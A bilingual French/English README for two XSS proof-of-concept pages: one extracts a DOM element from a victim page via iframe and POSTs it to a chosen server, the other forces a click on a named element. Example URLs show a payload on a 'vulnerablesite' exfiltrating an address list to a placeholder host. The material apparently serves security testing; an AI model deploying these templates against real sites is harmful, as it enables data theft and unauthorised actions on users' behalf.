# 📄 README – PoC Extractor Page

## 🇫🇷 Français

### Description
Cette page HTML est un générateur de **Proof of Concept (PoC)**.  
Elle permet de charger une page cible dans une iframe, d’extraire un élément précis du DOM, puis d’envoyer cet élément vers un serveur de ton choix / ou de simplement el simuler en mettant une alert.

---

### Paramètres disponibles
- **`path`** : définit la page à charger dans l’iframe (`/path`).
- **`extract`** : définit l’élément à extraire (via son `id`).
- **`url`** : définit l’adresse de ton serveur pour recevoir les données (⚠️ remplacer par ton propre serveur).

---

### Fonctionnement
1. La page lit les paramètres `path`, `extract`, `url` dans l’URL.
2. Elle charge la page `/path` dans une iframe.
3. Après 10 secondes, elle extrait l’élément ayant `id=extract`.
4. Elle envoie le contenu HTML de cet élément vers `url` via une requête HTTP `POST` en JSON.

---

### Exemple
```
https://vulnerablesite/vulnerablepage?payload=your_payload_importing_the_script&path=addresses&extract=adresslist&url=https://monserveur.exemple/data
```

---

## 🇬🇧 English

### Description
This HTML page is a **Proof of Concept (PoC) generator**.  
It loads a target page inside an iframe, extracts a specific DOM element, and sends it to your own server.

---

### Parameters
- **`path`**: defines the page to load in the iframe (`/path`).
- **`extract`**: defines which element to extract (by its `id`).
- **`url`**: defines the server address where the extracted data will be sent (⚠️ replace with your own).

---

### Workflow
1. The page reads the `path`, `extract`, `url` query parameters.
2. It loads `/path` in the iframe.
3. After 10 seconds, it extracts the element with `id=extract`.
4. It sends the HTML content to the `url` server using a JSON `POST`.

---

### Example
```
https://vulnerablesite/vulnerablepage?payload=your_payload_importing_the_script&path=addresses&extract=adresslist&url=https://monserveur.exemple/data
```

---

# 📄 README – PoC Clicker Page

## 🇫🇷 Français

### Description
Cette page HTML est un générateur de **PoC d’interaction**.  
Elle permet de charger une page cible dans une iframe, puis de **simuler un clic** sur un élément défini par son attribut `name`.

---

### Paramètres disponibles
- **`path`** : définit la page à charger dans l’iframe (`/path`).
- **`clickon`** : définit l’élément sur lequel cliquer (via son `name`).

---

### Fonctionnement
1. La page lit les paramètres `path` et `clickon` dans l’URL.
2. Elle charge `/path` dans une iframe.
3. Après 15 secondes (pour laisser la page se charger), le script recherche l’élément ayant le name qui correspond a la valeur renseigné dans le paramètre `clickon.
4. Cet élément est cliqué.

---

### Exemple
```
https://vulnerablesite/vulnerablepage?payload=your_payload_importing_the_script&path=home&clickon=subscribe
```

---

## 🇬🇧 English

### Description
This HTML page is an **interaction PoC generator**.  
It loads a target page inside an iframe and automatically **simulates a click** on an element defined by its `name` attribute.

---

### Parameters
- **`path`**: defines the page to load in the iframe (`/path`).
- **`clickon`**: defines which element to click (by its `name`).

---

### Workflow
1. The page reads the `path` and `clickon` query parameters.
2. It loads `/path` in the iframe.
3. After 15 seconds, the script looks for the element with the name corresponding to the value filled in parameter `clickon`.
4. That element is clicked.

---

### Example
```
https://vulnerablesite/vulnerablepage?payload=your_payload_importing_the_script&path=home&clickon=subscribe
```
